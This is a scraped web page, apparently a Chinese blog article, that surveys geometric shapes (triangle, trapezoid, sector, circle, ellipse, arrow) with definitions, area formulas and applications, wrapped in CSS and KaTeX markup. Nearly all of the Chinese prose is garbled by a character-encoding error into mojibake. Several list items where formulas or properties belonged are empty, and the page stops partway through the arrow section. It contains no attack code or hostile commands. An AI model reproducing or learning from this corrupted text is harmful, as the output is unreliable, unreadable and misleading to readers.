                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ğŸ“â¡ï¸ğŸªœâ¡ï¸ğŸ¥§â¡ï¸â­•â¡ï¸ğŸ›â¡ï¸ğŸ§­åœ¨æ•°å­¦ã€å·¥ç¨‹ã€è®¾è®¡ä¹ƒè‡³æ—¥å¸¸ç”Ÿæ´»ä¸­ï¼Œå‡ ä½•å›¾å½¢ä¸ä»…æ˜¯æŠ½è±¡æ€ç»´çš„è½½ä½“ï¼Œæ›´æ˜¯äººç±»ç†è§£ç©ºé—´ã€æ„å»ºç»“æ„ã€ä¼ é€’ä¿¡æ¯çš„é‡è¦å·¥å…·ã€‚ä»æœ€ç®€å•çš„ä¸‰è§’å½¢å¼€å§‹ï¼Œç»è¿‡æ¢¯å½¢ã€æ‰‡å½¢ã€åœ†å½¢ã€æ¤­åœ†ï¼Œæœ€ç»ˆæ¼”åŒ–ä¸ºå…·æœ‰æ–¹å‘æ„ä¹‰çš„ç®­å¤´ï¼Œè¿™ä¸€åºåˆ—ä¸ä»…ä½“ç°äº†å›¾å½¢å¤æ‚åº¦çš„é€’å¢ï¼Œä¹Ÿåæ˜ äº†åŠŸèƒ½ä»é™æ€æè¿°å‘åŠ¨æ€æŒ‡ç¤ºçš„è½¬å˜ã€‚æœ¬æ–‡å°†æ·±å…¥æ¢è®¨è¿™äº›å›¾å½¢çš„å®šä¹‰ã€æ€§è´¨ã€åº”ç”¨åœºæ™¯åŠå…¶ç›¸äº’ä¹‹é—´çš„è”ç³»ï¼ŒåŠ›æ±‚å…¨é¢è€Œè¯¦å°½ã€‚</p>
<hr/>
<h2 data-id="heading-0">ğŸ“ ä¸‰è§’å½¢ï¼ˆTriangleï¼‰</h2>
<p>ä¸‰è§’å½¢æ˜¯ç”±ä¸‰æ¡çº¿æ®µé¦–å°¾ç›¸è¿æ‰€å›´æˆçš„å¹³é¢å›¾å½¢ï¼Œæ˜¯æœ€åŸºæœ¬çš„å¤šè¾¹å½¢ä¹‹ä¸€ã€‚å…¶å†…è§’å’Œæ’ä¸º180Â°ï¼Œè¿™æ˜¯æ¬§å‡ é‡Œå¾—å‡ ä½•ä¸­çš„æ ¸å¿ƒå®šç†ä¹‹ä¸€ã€‚</p>
<h3 data-id="heading-1">åˆ†ç±»æ–¹å¼</h3>
<ul>
<li>
<p><strong>æŒ‰è¾¹é•¿</strong>ï¼š</p>
<ul>
<li>ç­‰è¾¹ä¸‰è§’å½¢ï¼ˆä¸‰è¾¹ç›¸ç­‰ï¼Œä¸‰ä¸ªè§’å‡ä¸º60Â°ï¼‰</li>
<li>ç­‰è…°ä¸‰è§’å½¢ï¼ˆä¸¤è¾¹ç›¸ç­‰ï¼Œåº•è§’ç›¸ç­‰ï¼‰</li>
<li>ä¸ç­‰è¾¹ä¸‰è§’å½¢ï¼ˆä¸‰è¾¹å‡ä¸ç›¸ç­‰ï¼‰</li>
</ul>
</li>
<li>
<p><strong>æŒ‰è§’åº¦</strong>ï¼š</p>
<ul>
<li>é”è§’ä¸‰è§’å½¢ï¼ˆä¸‰ä¸ªè§’å‡å°äº90Â°ï¼‰</li>
<li>ç›´è§’ä¸‰è§’å½¢ï¼ˆä¸€ä¸ªè§’ä¸º90Â°ï¼Œæ»¡è¶³å‹¾è‚¡å®šç† <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mn>2</mn></msup><mo>+</mo><msup><mi>b</mi><mn>2</mn></msup><mo>=</mo><msup><mi>c</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">a^2 + b^2 = c^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"/><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8141em;"/><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8141em;"/><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span>ï¼‰</li>
<li>é’è§’ä¸‰è§’å½¢ï¼ˆä¸€ä¸ªè§’å¤§äº90Â°ï¼‰</li>
</ul>
</li>
</ul>
<h3 data-id="heading-2">é‡è¦æ€§è´¨</h3>
<ul>
<li>
<p><strong>ç¨³å®šæ€§</strong>ï¼šä¸‰è§’å½¢æ˜¯å”¯ä¸€å…·æœ‰â€œåˆšæ€§â€çš„å¤šè¾¹å½¢â€”â€”åœ¨ä¸æ”¹å˜è¾¹é•¿çš„æƒ…å†µä¸‹æ— æ³•å˜å½¢ï¼Œå› æ­¤å¹¿æ³›åº”ç”¨äºæ¡¥æ¢ã€å¡”æ¶ã€æ¡æ¶ç­‰å·¥ç¨‹ç»“æ„ä¸­ã€‚</p>
</li>
<li>
<p><strong>é‡å¿ƒã€å‚å¿ƒã€å†…å¿ƒã€å¤–å¿ƒ</strong>ï¼šä¸‰è§’å½¢æ‹¥æœ‰å¤šä¸ªç‰¹æ®Šç‚¹ï¼Œåˆ†åˆ«å¯¹åº”è´¨é‡ä¸­å¿ƒã€é«˜çº¿äº¤ç‚¹ã€å†…åˆ‡åœ†åœ†å¿ƒã€å¤–æ¥åœ†åœ†å¿ƒã€‚</p>
</li>
<li>
<p><strong>é¢ç§¯å…¬å¼</strong>ï¼š</p>
<ul>
<li>åŸºç¡€å…¬å¼ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo>Ã—</mo><mtext>åº•</mtext><mo>Ã—</mo><mtext>é«˜</mtext></mrow><annotation encoding="application/x-tex">A = \frac{1}{2} \times åº• \times é«˜</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"/><span class="mord cjk_fallback">åº•</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord cjk_fallback">é«˜</span></span></span></span></span></li>
<li/>
</ul>
</li>
</ul>
<h3 data-id="heading-3">åº”ç”¨é¢†åŸŸ</h3>
<ul>
<li>å»ºç­‘å­¦ï¼ˆå±‹é¡¶ç»“æ„ã€æ¡æ¶ï¼‰</li>
<li>è®¡ç®—æœºå›¾å½¢å­¦ï¼ˆ3Då»ºæ¨¡çš„åŸºæœ¬å•å…ƒï¼‰</li>
<li>å¯¼èˆªä¸æµ‹é‡ï¼ˆä¸‰è§’æµ‹é‡æ³•ï¼‰</li>
</ul>
<hr/>
<h2 data-id="heading-4">ğŸªœ æ¢¯å½¢ï¼ˆTrapezoid / Trapeziumï¼‰</h2>
<p>æ¢¯å½¢æ˜¯è‡³å°‘æœ‰ä¸€ç»„å¯¹è¾¹å¹³è¡Œçš„å››è¾¹å½¢ã€‚åœ¨ç¾å¼è‹±è¯­ä¸­ç§°ä¸º <em>trapezoid</em>ï¼Œè€Œåœ¨è‹±å¼è‹±è¯­ä¸­ <em>trapezium</em> æŒ‡æ— å¹³è¡Œè¾¹çš„å››è¾¹å½¢ï¼Œéœ€æ³¨æ„æœ¯è¯­å·®å¼‚ã€‚</p>
<h3 data-id="heading-5">å®šä¹‰ä¸åˆ†ç±»</h3>
<ul>
<li><strong>æ™®é€šæ¢¯å½¢</strong>ï¼šä»…ä¸€ç»„å¯¹è¾¹å¹³è¡Œï¼ˆç§°ä¸ºâ€œåº•â€ï¼‰ï¼Œå¦ä¸¤è¾¹ä¸ºâ€œè…°â€ã€‚</li>
<li><strong>ç­‰è…°æ¢¯å½¢</strong>ï¼šéå¹³è¡Œè¾¹ï¼ˆè…°ï¼‰é•¿åº¦ç›¸ç­‰ï¼Œåº•è§’ç›¸ç­‰ï¼Œå…·æœ‰å¯¹ç§°è½´ã€‚</li>
<li><strong>ç›´è§’æ¢¯å½¢</strong>ï¼šå…¶ä¸­ä¸€ä¸ªè…°å‚ç›´äºåº•è¾¹ï¼Œå½¢æˆä¸¤ä¸ªç›´è§’ã€‚</li>
</ul>
<h3 data-id="heading-6">æ€§è´¨</h3>
<ul>
<li>ä¸­ä½çº¿ï¼ˆè¿æ¥ä¸¤è…°ä¸­ç‚¹çš„çº¿æ®µï¼‰é•¿åº¦ç­‰äºä¸¤åº•ä¹‹å’Œçš„ä¸€åŠã€‚</li>
<li>é¢ç§¯å…¬å¼ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><mfrac><mrow><mo stretchy="false">(</mo><mtext>ä¸Šåº•</mtext><mo>+</mo><mtext>ä¸‹åº•</mtext><mo stretchy="false">)</mo><mo>Ã—</mo><mtext>é«˜</mtext></mrow><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">A = \frac{(ä¸Šåº• + ä¸‹åº•) \times é«˜}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.355em;vertical-align:-0.345em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord cjk_fallback mtight">ä¸Šåº•</span><span class="mbin mtight">+</span><span class="mord cjk_fallback mtight">ä¸‹åº•</span><span class="mclose mtight">)</span><span class="mbin mtight">Ã—</span><span class="mord cjk_fallback mtight">é«˜</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></li>
</ul>
<h3 data-id="heading-7">åº”ç”¨</h3>
<ul>
<li>åœŸæœ¨å·¥ç¨‹ï¼ˆå ¤åæ¨ªæˆªé¢ã€æ¸ é“è®¾è®¡ï¼‰</li>
<li>æœºæ¢°è®¾è®¡ï¼ˆæ»‘å—å¯¼è½¨ã€æ¥”å½¢ç»“æ„ï¼‰</li>
<li>è‰ºæœ¯æ„å›¾ï¼ˆè¥é€ é€è§†æ„Ÿæˆ–ç¨³å®šæ„Ÿï¼‰</li>
</ul>
<p>æ¢¯å½¢å¯è§†ä¸ºä¸‰è§’å½¢çš„â€œæ‰©å±•â€â€”â€”è‹¥å°†ä¸‰è§’å½¢é¡¶éƒ¨æˆªå»ä¸€éƒ¨åˆ†ï¼Œå³å¾—æ¢¯å½¢ã€‚è¿™ç§â€œæˆªæ–­â€æ“ä½œåœ¨å‡ ä½•å˜æ¢ä¸­ååˆ†å¸¸è§ã€‚</p>
<hr/>
<h2 data-id="heading-8">ğŸ¥§ æ‰‡å½¢ï¼ˆSector of a Circleï¼‰</h2>
<p>æ‰‡å½¢æ˜¯ç”±åœ†å¿ƒè§’åŠå…¶æ‰€å¯¹çš„å¼§ä¸ä¸¤æ¡åŠå¾„å›´æˆçš„å›¾å½¢ï¼Œå½¢å¦‚æŠ«è¨åˆ‡ç‰‡ï¼Œæ•…å¸¸ç”¨ğŸ•è¡¨ç¤ºï¼Œä½†æ­¤å¤„æ›´å¼ºè°ƒå…¶å‡ ä½•å±æ€§ï¼Œæ•…ç”¨ğŸ¥§ï¼ˆæ´¾ï¼‰è±¡å¾ã€‚</p>
<h3 data-id="heading-9">æ„æˆè¦ç´ </h3>
<ul>
<li/>
<li>åœ†å¿ƒè§’ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î¸</mi></mrow><annotation encoding="application/x-tex">\theta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">Î¸</span></span></span></span></span>ï¼ˆå¯ç”¨åº¦æ•°æˆ–å¼§åº¦è¡¨ç¤ºï¼‰</li>
<li/>
<li/>
</ul>
<h3 data-id="heading-10">ç‰¹æ®Šæƒ…å½¢</h3>
<ul>
<li/>
<li/>
<li/>
</ul>
<h3 data-id="heading-11">åº”ç”¨åœºæ™¯</h3>
<ul>
<li>ä»ªè¡¨ç›˜è®¾è®¡ï¼ˆé€Ÿåº¦è¡¨ã€ç”µé‡æ˜¾ç¤ºï¼‰</li>
<li>ç»Ÿè®¡å›¾è¡¨ï¼ˆé¥¼å›¾ Pie Chart çš„åŸºæœ¬å•å…ƒï¼‰</li>
<li>å…‰å­¦ï¼ˆæ¿€å…‰æŸå‘æ•£è§’ã€ç…§æ˜è¦†ç›–åŒºåŸŸï¼‰</li>
<li>æœºæ¢°ï¼ˆé½¿è½®é½¿å½¢ã€å‡¸è½®è½®å»“ï¼‰</li>
</ul>
<p>æ‰‡å½¢æ˜¯ä»åœ†å½¢â€œåˆ‡å‰²â€è€Œæ¥ï¼Œä½“ç°äº†ä»æ•´ä½“åˆ°å±€éƒ¨çš„åˆ†ææ€ç»´ã€‚</p>
<hr/>
<h2 data-id="heading-12">â­• åœ†å½¢ï¼ˆCircleï¼‰</h2>
<p>åœ†å½¢æ˜¯å¹³é¢ä¸Šåˆ°å®šç‚¹ï¼ˆåœ†å¿ƒï¼‰è·ç¦»ç­‰äºå®šé•¿ï¼ˆåŠå¾„ï¼‰çš„æ‰€æœ‰ç‚¹çš„é›†åˆï¼Œå…·æœ‰å®Œç¾çš„å¯¹ç§°æ€§ã€‚</p>
<h3 data-id="heading-13">æ ¸å¿ƒæ€§è´¨</h3>
<ul>
<li>å‘¨é•¿ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>=</mo><mn>2</mn><mi>Ï€</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">C = 2\pi r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span></span></li>
<li>é¢ç§¯ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><mi>Ï€</mi><msup><mi>r</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">A = \pi r^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8141em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></li>
<li>ä»»æ„ç›´å¾„å°†åœ†åˆ†ä¸ºä¸¤ä¸ªå…¨ç­‰åŠåœ†</li>
<li>åœ†å‘¨è§’å®šç†ï¼šåŒå¼§æ‰€å¯¹çš„åœ†å‘¨è§’ç›¸ç­‰ï¼Œä¸”ä¸ºåœ†å¿ƒè§’çš„ä¸€åŠ</li>
</ul>
<h3 data-id="heading-14">å¯¹ç§°æ€§</h3>
<ul>
<li>æ— é™æ¡å¯¹ç§°è½´ï¼ˆæ¯æ¡ç›´å¾„éƒ½æ˜¯å¯¹ç§°è½´ï¼‰</li>
<li>ä¸­å¿ƒå¯¹ç§°å›¾å½¢</li>
</ul>
<h3 data-id="heading-15">åº”ç”¨</h3>
<ul>
<li>è½¦è½®ï¼ˆæ»šåŠ¨æ‘©æ“¦æœ€å°ï¼‰</li>
<li>é½¿è½®ä¼ åŠ¨ï¼ˆå‡åŒ€å—åŠ›ï¼‰</li>
<li>å¤©æ–‡è½¨é“ï¼ˆç†æƒ³åŒ–æ¨¡å‹ï¼‰</li>
<li>ä¿¡å·ä¼ æ’­ï¼ˆæ³¢å‰å‘ˆåœ†å½¢æ‰©æ•£ï¼‰</li>
</ul>
<p>åœ†å½¢æ˜¯æ‰€æœ‰å°é—­æ›²çº¿ä¸­ï¼Œåœ¨ç»™å®šå‘¨é•¿ä¸‹é¢ç§¯æœ€å¤§çš„å›¾å½¢ï¼ˆç­‰å‘¨å®šç†ï¼‰ï¼Œä½“ç°äº†è‡ªç„¶ç•Œçš„æ•ˆç‡æœ€ä¼˜ã€‚</p>
<hr/>
<h2 data-id="heading-16">ğŸ› æ¤­åœ†ï¼ˆEllipseï¼‰</h2>
<p>æ¤­åœ†æ˜¯å¹³é¢ä¸Šåˆ°ä¸¤ä¸ªå®šç‚¹ï¼ˆç„¦ç‚¹ï¼‰çš„è·ç¦»ä¹‹å’Œä¸ºå¸¸æ•°çš„ç‚¹çš„è½¨è¿¹ã€‚å½“ä¸¤ç„¦ç‚¹é‡åˆæ—¶ï¼Œæ¤­åœ†é€€åŒ–ä¸ºåœ†å½¢ã€‚</p>
<h3 data-id="heading-17">æ•°å­¦è¡¨è¾¾</h3>
<ul>
<li/>
<li/>
<li>ç¦»å¿ƒç‡ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>=</mo><mfrac><mi>c</mi><mi>a</mi></mfrac></mrow><annotation encoding="application/x-tex">e = \frac{c}{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.0404em;vertical-align:-0.345em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span>ï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>e</mi><mo>&lt;</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0 &lt; e &lt; 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"/><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>ï¼›<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">e=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span> æ—¶ä¸ºåœ†</li>
</ul>
<h3 data-id="heading-18">å‡ ä½•æ€§è´¨</h3>
<ul>
<li>ä¸¤æ¡å¯¹ç§°è½´ï¼ˆé•¿è½´ä¸çŸ­è½´ï¼‰</li>
<li>åå°„æ€§è´¨ï¼šä»ä¸€ç„¦ç‚¹å‘å‡ºçš„å…‰çº¿ç»æ¤­åœ†åå°„åå¿…è¿‡å¦ä¸€ç„¦ç‚¹ï¼ˆç”¨äºå£°å­¦èšç„¦ã€åŒ»ç–—ç¢çŸ³ï¼‰</li>
</ul>
<h3 data-id="heading-19">å®é™…åº”ç”¨</h3>
<ul>
<li>è¡Œæ˜Ÿè½¨é“ï¼ˆå¼€æ™®å‹’ç¬¬ä¸€å®šå¾‹ï¼‰</li>
<li>å»ºç­‘ç©¹é¡¶ï¼ˆå¦‚ç¾å›½å›½ä¼šå¤§å¦ï¼‰</li>
<li>å…‰å­¦é•œé¢ï¼ˆæ¤­åœ†åå°„é•œï¼‰</li>
<li>å·¥ç¨‹åˆ¶å›¾ï¼ˆæ–œæˆªåœ†æŸ±çš„æˆªé¢ä¸ºæ¤­åœ†ï¼‰</li>
</ul>
<p>æ¤­åœ†å¯è§†ä¸ºåœ†å½¢åœ¨æŸä¸€æ–¹å‘ä¸Šçš„â€œæ‹‰ä¼¸â€æˆ–â€œå‹ç¼©â€ï¼Œæ˜¯ä»¿å°„å˜æ¢ä¸‹çš„ä¸å˜å›¾å½¢ã€‚</p>
<hr/>
<h2 data-id="heading-20">ğŸ§­ ç®­å¤´ï¼ˆArrowï¼‰</h2>
<p>ç®­å¤´å¹¶éä¼ ç»Ÿå‡ ä½•å›¾å½¢ï¼Œè€Œæ˜¯ä¸€ç§<strong>ç¬¦å·æ€§å›¾å½¢</strong>ï¼Œç”¨äºè¡¨ç¤ºæ–¹å‘ã€æµç¨‹ã€è¶‹åŠ¿æˆ–æŒ‡ç¤ºã€‚</p>
<h3 data-id="heading-21">ç»“æ„æˆåˆ†</h3>
<ul>
